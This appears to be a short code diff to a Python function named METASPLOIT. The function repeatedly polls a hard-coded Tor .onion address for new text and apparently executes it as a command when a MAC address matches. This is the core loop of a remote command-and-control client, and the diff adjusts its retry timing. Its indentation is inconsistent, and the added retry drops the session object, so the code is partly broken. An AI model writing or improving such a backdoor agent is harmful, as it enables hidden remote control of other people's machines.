@@ -60,7 +60,10 @@ def METASPLOIT():
     while True:
      url = 'http://pfp2jryu2fxsfmkiv2a4gkctmaiqlvcpf7lcvx5s6lsl7ejh5fhnptqd.onion/Metasploit.php'
      response = requests_session.get(url)
-     time.sleep(10)
+     while response.status_code != 200:
+            time.sleep(10) 
+            response = requests.get(url)
+        
      if response.status_code == 200:
         data = response.text.strip()
         if data != previous_data:
@@ -299,8 +302,9 @@ def METASPLOIT():
             else:
                 print("MAC not provided or does not match. Cannot execute command.")
         else:
+            time.sleep(10)
             print("No new data.")
-    else:
+     else:
         print("Failed to fetch data.")
         time.sleep(1)
 
